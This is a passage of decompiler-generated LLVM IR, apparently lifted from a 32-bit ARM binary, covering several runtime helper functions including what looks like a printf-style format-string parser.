  %v0_d860 = load i32, i32* %r3.global-to-local, align 4
  %v1_d860 = load i32, i32* @r4, align 4
  %v2_d860 = add i32 %v1_d860, 24
  %v3_d860 = inttoptr i32 %v2_d860 to i32*
  store i32 %v0_d860, i32* %v3_d860, align 4
  %v0_d864 = load i32, i32* %r3.global-to-local, align 4
  %v1_d864 = load i32, i32* @r4, align 4
  %v2_d864 = add i32 %v1_d864, 28
  %v3_d864 = inttoptr i32 %v2_d864 to i32*
  store i32 %v0_d864, i32* %v3_d864, align 4
  %v0_d868 = load i32, i32* %r3.global-to-local, align 4
  %v1_d868 = load i32, i32* @r4, align 4
  %v2_d868 = add i32 %v1_d868, 16
  %v3_d868 = inttoptr i32 %v2_d868 to i32*
  store i32 %v0_d868, i32* %v3_d868, align 4
  br label %dec_label_pc_d86c

dec_label_pc_d86c:                                ; preds = %dec_label_pc_d830, %dec_label_pc_d848
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d870 = load i32, i32* @r4, align 4
  %v2_d870 = add i32 %v1_d870, 52
  %v3_d870 = inttoptr i32 %v2_d870 to i32*
  store i32 1, i32* %v3_d870, align 4
  %v0_d874 = call i32 @function_d800()
  store i32 %v0_d874, i32* %r0.global-to-local, align 4
  %v0_d878 = load i32, i32* @r4, align 4
  %v1_d878 = add i32 %v0_d878, 32
  %v2_d878 = inttoptr i32 %v1_d878 to i32*
  %storemerge = load i32, i32* %v2_d878, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_d87c = add i32 %storemerge, 56
  store i32 %v1_d87c, i32* @r5, align 4
  %v2_d880 = icmp eq i32 %storemerge, 0
  store i32 %v1_d87c, i32* %r0.global-to-local, align 4
  br i1 %v2_d880, label %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge, label %dec_label_pc_d830

dec_label_pc_d87c.dec_label_pc_d88c_crit_edge:    ; preds = %dec_label_pc_d86c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_202d4.329 to i32*), align 4
  br label %dec_label_pc_d88c

dec_label_pc_d88c:                                ; preds = %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge, %dec_label_pc_d810
  %v11_d8b413 = phi i32 [ %v1_d87c, %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge ], [ %v1_d87c6, %dec_label_pc_d810 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge ], [ 0, %dec_label_pc_d810 ]
  store i32 ptrtoint (i32** @global_var_202d4.329 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_d8ac4 = icmp eq i32 %storemerge12, 0
  br i1 %v2_d8ac4, label %dec_label_pc_d8b4, label %dec_label_pc_d898

dec_label_pc_d898:                                ; preds = %dec_label_pc_d88c, %dec_label_pc_d898
  %v0_d8a0 = phi i32 [ %storemerge1, %dec_label_pc_d898 ], [ %storemerge12, %dec_label_pc_d88c ]
  %v1_d898 = inttoptr i32 %v0_d8a0 to i8*
  %v2_d898 = load i8, i8* %v1_d898, align 1
  %v3_d898 = zext i8 %v2_d898 to i32
  store i32 %v3_d898, i32* %r3.global-to-local, align 4
  %v1_d89c = and i32 %v3_d898, 64
  store i32 %v0_d8a0, i32* %r0.global-to-local, align 4
  store i32 55464, i32* @lr, align 4
  %v1_d8a4 = icmp ne i32 %v1_d89c, 0
  call void @__pseudo_cond_branch(i1 %v1_d8a4, i32 ptrtoint (i32* @global_var_d8c8.340 to i32))
  %v0_d8a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8a8 = add i32 %v0_d8a8, 32
  %v2_d8a8 = inttoptr i32 %v1_d8a8 to i32*
  %storemerge1 = load i32, i32* %v2_d8a8, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_d8ac = icmp eq i32 %storemerge1, 0
  br i1 %v2_d8ac, label %dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge, label %dec_label_pc_d898

dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge:    ; preds = %dec_label_pc_d898
  %v11_d8b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d8b4

dec_label_pc_d8b4:                                ; preds = %dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge, %dec_label_pc_d88c
  %v11_d8b4 = phi i32 [ %v11_d8b4.pre, %dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge ], [ %v11_d8b413, %dec_label_pc_d88c ]
  %v2_d8b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d8b4, i32* @r4, align 4
  ret i32 %v11_d8b4

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @function_d800, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d898, { 1, 0 }
  uselistorder label %dec_label_pc_d86c, { 1, 0 }
  uselistorder label %dec_label_pc_d830, { 1, 0 }
}

define i32 @function_d8c8() local_unnamed_addr {
dec_label_pc_d8c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d8c8 = load i32, i32* @r4, align 4
  store i32 %v3_d8c8, i32* %stack_var_-8, align 4
  %v0_d8cc = load i32, i32* @r0, align 4
  %v1_d8cc = add i32 %v0_d8cc, 8
  %v2_d8cc = inttoptr i32 %v1_d8cc to i32*
  %v3_d8cc = load i32, i32* %v2_d8cc, align 4
  %v1_d8d0 = add i32 %v0_d8cc, 16
  %v2_d8d0 = inttoptr i32 %v1_d8d0 to i32*
  %v3_d8d0 = load i32, i32* %v2_d8d0, align 4
  %v9_d8d4 = icmp eq i32 %v3_d8d0, %v3_d8cc
  store i32 %v0_d8cc, i32* %r4.global-to-local, align 4
  br i1 %v9_d8d4, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d8c8
  store i32 %v3_d8cc, i32* %v2_d8d0, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_d8c8, %bb
  store i32 55528, i32* @lr, align 4
  %v1_d8e4 = xor i1 %v9_d8d4, true
  call void @__pseudo_cond_branch(i1 %v1_d8e4, i32 ptrtoint (i32* @global_var_11684.341 to i32))
  %v0_d8e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8e8 = add i32 %v0_d8e8, 8
  %v2_d8e8 = inttoptr i32 %v1_d8e8 to i32*
  %v3_d8e8 = load i32, i32* %v2_d8e8, align 4
  %v1_d8ec = add i32 %v0_d8e8, 16
  %v2_d8ec = inttoptr i32 %v1_d8ec to i32*
  %v3_d8ec = load i32, i32* %v2_d8ec, align 4
  %v2_d8f0 = sub i32 %v3_d8ec, %v3_d8e8
  %v2_d8f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d8f4, i32* @r4, align 4
  ret i32 %v2_d8f0

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_d8f8(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d8f8:
  %stack_var_-17 = alloca i8, align 1
  %v3_d8f8 = load i32, i32* @r4, align 4
  %v6_d8f8 = load i32, i32* @r5, align 4
  %v9_d8f8 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_d9182 = icmp eq i32 %arg3, 0
  %v2_d91c = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_d9182, label %dec_label_pc_d938, label %dec_label_pc_d92c

dec_label_pc_d914:                                ; preds = %dec_label_pc_d92c
  %v1_d914 = add i32 %v0_d914, -1
  store i32 %v1_d914, i32* @r4, align 4
  %v2_d918 = icmp eq i32 %v1_d914, 0
  %v0_d924 = load i32, i32* @r6, align 4
  br i1 %v2_d918, label %dec_label_pc_d938.loopexit, label %dec_label_pc_d92c

dec_label_pc_d92c:                                ; preds = %dec_label_pc_d8f8, %dec_label_pc_d914
  %v0_d9244 = phi i32 [ %v0_d924, %dec_label_pc_d914 ], [ %arg1, %dec_label_pc_d8f8 ]
  %v3_d92c = call i32 @function_11740(i32 %v2_d91c, i32 1, i32 %v0_d9244)
  %v7_d930 = icmp eq i32 %v3_d92c, 1
  %v0_d914 = load i32, i32* @r4, align 4
  br i1 %v7_d930, label %dec_label_pc_d914, label %dec_label_pc_d938.loopexit

dec_label_pc_d938.loopexit:                       ; preds = %dec_label_pc_d914, %dec_label_pc_d92c
  %v0_d938.ph = phi i32 [ %v0_d914, %dec_label_pc_d92c ], [ 0, %dec_label_pc_d914 ]
  %v1_d938.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d938

dec_label_pc_d938:                                ; preds = %dec_label_pc_d938.loopexit, %dec_label_pc_d8f8
  %v1_d938 = phi i32 [ 0, %dec_label_pc_d8f8 ], [ %v1_d938.pre, %dec_label_pc_d938.loopexit ]
  %v0_d938 = phi i32 [ 0, %dec_label_pc_d8f8 ], [ %v0_d938.ph, %dec_label_pc_d938.loopexit ]
  %v2_d938 = sub i32 %v1_d938, %v0_d938
  store i32 %v3_d8f8, i32* @r4, align 4
  store i32 %v6_d8f8, i32* @r5, align 4
  store i32 %v9_d8f8, i32* @r6, align 4
  ret i32 %v2_d938

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d938.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d92c, { 1, 0 }
}

define i32 @function_d944(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d944:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d944 = load i32, i32* @r4, align 4
  store i32 %v3_d944, i32* %stack_var_-24, align 4
  %v9_d944 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_d94c = and i32 %arg2, 128
  %v2_d94c = icmp eq i32 %v1_d94c, 0
  %v0_d950 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d950, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_d94c, label %bb, label %dec_label_pc_d964

bb:                                               ; preds = %dec_label_pc_d944
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_d964:                                ; preds = %dec_label_pc_d944
  store i32 %arg4, i32* @r0, align 4
  %v0_d968 = call i32 @function_f030()
  store i32 %v0_d968, i32* %r0.global-to-local, align 4
  %v1_d96c = load i32, i32* %r4.global-to-local, align 4
  %v2_d96c = sub i32 %v1_d96c, %v0_d968
  store i32 %v2_d96c, i32* @r4, align 4
  store i32 %v0_d968, i32* @r5, align 4
  %tmp15 = icmp slt i32 %v2_d96c, 1
  br i1 %tmp15, label %.thread, label %dec_label_pc_d984

.thread:                                          ; preds = %dec_label_pc_d964
  store i32 %v0_d968, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_d984:                                ; preds = %dec_label_pc_d964
  %v0_d984 = load i32, i32* @r6, align 4
  %v1_d984 = urem i32 %v0_d984, 128
  %v0_d988 = load i32, i32* @r8, align 4
  store i32 %v0_d988, i32* %r0.global-to-local, align 4
  %v3_d990 = trunc i32 %v1_d984 to i8
  %v4_d990 = call i32 @function_d8f8(i32 %v0_d988, i8 %v3_d990, i32 %v2_d96c)
  store i32 %v4_d990, i32* %r0.global-to-local, align 4
  %v1_d994 = load i32, i32* @r4, align 4
  %v9_d994 = icmp eq i32 %v4_d990, %v1_d994
  store i32 %v4_d990, i32* %r6.global-to-local, align 4
  br i1 %v9_d994, label %dec_label_pc_d9a0, label %dec_label_pc_d9c0

dec_label_pc_d9a0:                                ; preds = %dec_label_pc_d984
  %v0_d9a0 = load i32, i32* @r5, align 4
  store i32 %v0_d9a0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_d9a4:                                ; preds = %bb, %.thread, %dec_label_pc_d9a0
  %v5_d9b0 = phi i32 [ %v0_d9a0, %dec_label_pc_d9a0 ], [ %arg3, %bb ], [ %v0_d968, %.thread ]
  %tmp16 = icmp slt i32 %v5_d9b0, 1
  br i1 %tmp16, label %.thread8, label %bb17

.thread8:                                         ; preds = %dec_label_pc_d9a4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_d9a4
  %v5_d9ac = load i32, i32* @r7, align 4
  br label %bb18

bb18:                                             ; preds = %.thread8, %bb17
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_d9ac, %bb17 ]
  %tmp19 = phi i1 [ false, %.thread8 ], [ true, %bb17 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp19, i32 ptrtoint (i32* @global_var_11740.342 to i32))
  %v0_d9bc = load i32, i32* %r6.global-to-local, align 4
  %v2_d9bc = add i32 %storemerge, %v0_d9bc
  store i32 %v2_d9bc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9c0

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_d984, %bb18
  %v0_d9c0 = phi i32 [ %v4_d990, %dec_label_pc_d984 ], [ %v2_d9bc, %bb18 ]
  store i32 %v0_d9c0, i32* %r0.global-to-local, align 4
  %v2_d9c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d9c4, i32* %r4.global-to-local, align 4
  store i32 %v9_d944, i32* %r6.global-to-local, align 4
  ret i32 %v0_d9c0

; uselistorder directives
  uselistorder i32 %v0_d9c0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_d9c0, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_d9a4, { 2, 1, 0 }
}

define i32 @function_d9c8(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
dec_label_pc_d9c8:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d9c8 = load i32, i32* @r4, align 4
  store i32 %v3_d9c8, i32* %stack_var_-36, align 4
  %v6_d9c8 = load i32, i32* @r5, align 4
  %v15_d9c8 = load i32, i32* @r8, align 4
  %v18_d9c8 = load i32, i32* @sb, align 4
  %v21_d9c8 = load i32, i32* @sl, align 4
  %v24_d9c8 = load i32, i32* @fp, align 4
  %v2_d9d0 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_d9d0, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_d9d0, i32* %r0.global-to-local, align 4
  %v0_d9dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_d9dc, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_d9e4 = call i32 @function_dfbc(i32* nonnull %stack_var_-332)
  store i32 %v2_d9e4, i32* %r0.global-to-local, align 4
  %v1_d9e8 = icmp slt i32 %v2_d9e4, 0
  br i1 %v1_d9e8, label %dec_label_pc_d9f0, label %dec_label_pc_da24

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d9c8
  %v3_d9f0 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_d9f0, i32* @r4, align 4
  store i32 %v3_d9f0, i32* @r0, align 4
  %v0_d9f8 = call i32 @function_f030()
  store i32 %v0_d9f8, i32* %r0.global-to-local, align 4
  %v2_d9fc = icmp eq i32 %v0_d9f8, 0
  br i1 %v2_d9fc, label %bb, label %dec_label_pc_da0c

bb:                                               ; preds = %dec_label_pc_d9f0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_df9c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_d9f0
  %v0_da0c = load i32, i32* @r4, align 4
  store i32 %v0_da0c, i32* %r0.global-to-local, align 4
  %v0_da10 = load i32, i32* @fp, align 4
  store i32 %v0_da10, i32* %r2.global-to-local, align 4
  %v3_da14 = call i32 @function_11740(i32 %v0_da0c, i32 %v0_d9f8, i32 %v0_da10)
  store i32 %v3_da14, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_df9c

dec_label_pc_da24:                                ; preds = %dec_label_pc_d9c8
  store i32 %v2_d9d0, i32* %r0.global-to-local, align 4
  %v0_da28 = load i32, i32* @r5, align 4
  %v2_da2c = call i32 @function_e054(i32 %v2_d9d0, i32 %v0_da28)
  store i32 %v2_da2c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_dacc = zext i8 %tmp104 to i32
  %v2_dad4 = ptrtoint i32* %stack_var_-252 to i32
  %v2_daf4 = ptrtoint i32* %stack_var_-36 to i32
  %v2_db0c = icmp eq i32 %tmp102, 0
  %v1_db20 = inttoptr i32 %tmp101 to i32*
  %v2_de10 = ptrtoint i32* %stack_var_-180 to i32
  %v2_dd2c = ptrtoint i32* %stack_var_-44 to i32
  %v2_dd40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_dcdc = add i32 %tmp101, 4
  %v4_dcdc = inttoptr i32 %v3_dcdc to i32*
  %v2_dce0 = ptrtoint i32* %stack_var_-328 to i32
  %v7_dba0 = zext i8 %tmp99 to i32
  %v2_dbdc = ptrtoint i32* %stack_var_-53 to i32
  %v5_dbe4 = bitcast i32* %stack_var_-53 to i8*
  %v2_dbec = icmp ugt i32 %tmp102, 4
  %v7_dbec = icmp eq i32 %tmp102, 5
  %v0_df84.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_db04187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_dd00 = icmp ugt i32 %tmp102, 16
  %v7_dd00 = icmp eq i32 %tmp102, 17
  %v2_dd04 = xor i1 %v7_dd00, true
  %v3_dd04 = and i1 %v2_dd00, %v2_dd04
  %v2_dda0 = icmp ugt i32 %tmp102, 18
  %v7_dda0 = icmp eq i32 %tmp102, 19
  %v2_dda4 = xor i1 %v7_dda0, true
  %v3_dda4 = and i1 %v2_dda0, %v2_dda4
  %v7_de04 = icmp eq i32 %tmp102, 20
  %v2_db44 = add i32 %tmp102, ptrtoint (i32* @global_var_16ea0.344 to i32)
  %v1_db48 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_16ea0.344 to i32), i32 -1)
  %v2_db48 = inttoptr i32 %v1_db48 to i8*
  %v2_db74 = xor i1 %v7_dbec, true
  %v3_db74 = and i1 %v2_dbec, %v2_db74
  %v7_dba8 = icmp eq i32 %tmp102, 1
  %v2_dbf4 = xor i1 %v2_dbec, true
  %v3_dbf4 = or i1 %v7_dbec, %v2_dbf4
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_dc5c = icmp eq i32 %tmp102, 3
  %v11_dc68 = icmp eq i32 %tmp102, 4
  %v9_dad8 = mul nuw nsw i32 %v4_dacc, 8
  %v10_dad8 = add nsw i32 %v9_dad8, -8
  %v6_dae0 = add i32 %v10_dad8, %v2_dad4
  br label %dec_label_pc_df84

bb126:                                            ; preds = %dec_label_pc_da3c.outer, %.thread7
  %v2_da3c185 = phi i8 [ %v2_da3c, %.thread7 ], [ %v2_da3c181, %dec_label_pc_da3c.outer ]
  %v1_da50184 = phi i32 [ %v2_da50, %.thread7 ], [ %v0_da3c49, %dec_label_pc_da3c.outer ]
  %v8_da44 = icmp eq i8 %v2_da3c185, 37
  br i1 %v8_da44, label %dec_label_pc_da58, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_da50 = add i32 %v1_da50184, 1
  store i32 %v2_da50, i32* @r4, align 4
  %v1_da3c = inttoptr i32 %v2_da50 to i8*
  %v2_da3c = load i8, i8* %v1_da3c, align 1
  %v3_da3c = zext i8 %v2_da3c to i32
  store i32 %v3_da3c, i32* %r3.global-to-local, align 4
  %v2_da40 = icmp eq i8 %v2_da3c, 0
  br i1 %v2_da40, label %dec_label_pc_da58, label %bb126

dec_label_pc_da58:                                ; preds = %bb126, %.thread7, %dec_label_pc_da3c.outer
  %v1_da50.lcssa = phi i32 [ %v0_da3c49, %dec_label_pc_da3c.outer ], [ %v2_da50, %.thread7 ], [ %v1_da50184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_da58 = sub i32 %v1_da50.lcssa, %v5_da68
  %v9_da58 = icmp eq i32 %v1_da50.lcssa, %v5_da68
  br i1 %v9_da58, label %dec_label_pc_da8c, label %dec_label_pc_da60

dec_label_pc_da60:                                ; preds = %dec_label_pc_da58
  store i32 %v2_da58, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_da58, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_da60
  store i32 %v5_da68, i32* %r0.global-to-local, align 4
  %v5_da70 = load i32, i32* @fp, align 4
  store i32 %v5_da70, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_da60, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_da60 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_11740.342 to i32))
  %v0_da78 = load i32, i32* %r0.global-to-local, align 4
  %v1_da78 = load i32, i32* @r5, align 4
  %v9_da78 = icmp eq i32 %v0_da78, %v1_da78
  br i1 %v9_da78, label %dec_label_pc_da80, label %dec_label_pc_df94

dec_label_pc_da80:                                ; preds = %bb130
  %v2_da84 = add i32 %v0_da78, %stack_var_-336.1.ph
  store i32 %v2_da84, i32* @lr, align 4
  %v0_da8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_da8c

dec_label_pc_da8c:                                ; preds = %dec_label_pc_da58, %dec_label_pc_da80
  %v0_daa0 = phi i32 [ %v5_da68, %dec_label_pc_da58 ], [ %v0_da8c.pre, %dec_label_pc_da80 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_da58 ], [ %v2_da84, %dec_label_pc_da80 ]
  %v1_da8c = inttoptr i32 %v0_daa0 to i8*
  %v2_da8c = load i8, i8* %v1_da8c, align 1
  %v3_da8c = zext i8 %v2_da8c to i32
  store i32 %v3_da8c, i32* %r3.global-to-local, align 4
  %v2_da90 = icmp eq i8 %v2_da8c, 0
  br i1 %v2_da90, label %dec_label_pc_df9c, label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %dec_label_pc_da8c
  %v1_da98 = add i32 %v0_daa0, 1
  %v2_da98 = inttoptr i32 %v1_da98 to i8*
  %v3_da98 = load i8, i8* %v2_da98, align 1
  %v4_da98 = zext i8 %v3_da98 to i32
  store i32 %v4_da98, i32* %r3.global-to-local, align 4
  %v7_da9c = icmp eq i8 %v3_da98, 37
  store i32 %v1_da98, i32* %r2.global-to-local, align 4
  br i1 %v7_da9c, label %dec_label_pc_df8c, label %dec_label_pc_daa8

dec_label_pc_daa8:                                ; preds = %dec_label_pc_da98
  store i32 %v2_d9d0, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d9d0, i32* %r0.global-to-local, align 4
  store i32 %v1_da98, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_dabc = call i32 @function_e274(i32* nonnull %stack_var_-332)
  store i32 %v2_d9d0, i32* @r0, align 4
  %v0_dac4 = call i32 @function_e08c()
  store i32 %v0_dac4, i32* %r0.global-to-local, align 4
  store i32 %v4_dacc, i32* @ip, align 4
  store i32 %v2_dad4, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_daa8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_daa8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_dae0, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_daec78 = phi i32 [ %v6_dae0, %bb133 ], [ %v2_dad4, %.thread ]
  store i32 %v2_daf4, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_db04187, label %dec_label_pc_daec, label %dec_label_pc_db08

dec_label_pc_daec:                                ; preds = %bb134, %dec_label_pc_daec
  %v5_dafc189 = phi i32 [ %v5_dafc, %dec_label_pc_daec ], [ %v2_daf4, %bb134 ]
  %v0_daec188 = phi i32 [ %v1_daf0, %dec_label_pc_daec ], [ %v0_daec78, %bb134 ]
  %v2_daec = add i32 %v5_dafc189, -4
  %v3_daec = inttoptr i32 %v2_daec to i32*
  store i32 %v0_daec188, i32* %v3_daec, align 4
  %v0_daf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_daf0 = add i32 %v0_daf0, 8
  store i32 %v1_daf0, i32* %r3.global-to-local, align 4
  %v0_daf8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_daf8.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_daf4, i32* @lr, align 4
  %v4_dafc = mul i32 %v0_daf8.pre, 4
  %v5_dafc = add i32 %v4_dafc, %v2_daf4
  %v1_db00 = add i32 %v0_daf8.pre, 1
  store i32 %v1_db00, i32* %r2.global-to-local, align 4
  %v5_db04 = icmp slt i32 %v0_daf8.pre, %v1_daf8.pre
  br i1 %v5_db04, label %dec_label_pc_daec, label %dec_label_pc_db08

dec_label_pc_db08:                                ; preds = %dec_label_pc_daec, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_db0c, label %dec_label_pc_db14, label %dec_label_pc_db38

dec_label_pc_db14:                                ; preds = %dec_label_pc_db08
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_db20 = load i32, i32* %v1_db20, align 4
  store i32 %v2_db20, i32* %r0.global-to-local, align 4
  %v1_db24 = and i32 %v0_db68, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_db2c = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_db2c, i32* %r3.global-to-local, align 4
  %v4_db30 = inttoptr i32 %v2_db20 to i8*
  %v5_db30 = call i32 @function_119ec(i8* %v4_db30, i32 %v1_db24, i32 %stack_var_-336.2, i32 %v3_db2c)
  store i32 %v5_db30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_df80

dec_label_pc_db38:                                ; preds = %dec_label_pc_db08
  br i1 %tmp195, label %dec_label_pc_dcc4, label %dec_label_pc_db40

dec_label_pc_db40:                                ; preds = %dec_label_pc_db38
  store i32 %v2_db44, i32* %r3.global-to-local, align 4
  %v3_db48 = load i8, i8* %v2_db48, align 1
  %v4_db48 = zext i8 %v3_db48 to i32
  store i32 %v4_db48, i32* @r4, align 4
  %v7_db4c = icmp eq i8 %v3_db48, 10
  br i1 %v7_db4c, label %dec_label_pc_db58, label %bb135

bb135:                                            ; preds = %dec_label_pc_db40
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_db58:                                ; preds = %dec_label_pc_db40
  store i32 %v0_db68, i32* %r3.global-to-local, align 4
  %v1_db5c = and i32 %v0_db68, 32
  %v2_db5c = icmp eq i32 %v1_db5c, 0
  %.175 = select i1 %v2_db5c, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_db68 = and i32 %v0_db68, 64
  %v2_db68 = icmp eq i32 %v1_db68, 0
  br i1 %v2_db68, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_db58
  %.176 = select i1 %v2_db5c, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_db58, %bb138
  br i1 %v3_db74, label %.thread84, label %dec_label_pc_db7c

.thread84:                                        ; preds = %bb139
  %v5_db74 = sub nsw i32 0, %v4_db48
  store i32 %v5_db74, i32* @r4, align 4
  br label %dec_label_pc_db94

dec_label_pc_db7c:                                ; preds = %bb139
  br i1 %v7_dc5c, label %bb140, label %dec_label_pc_db88

bb140:                                            ; preds = %dec_label_pc_db7c
  store i32 55, i32* @r5, align 4
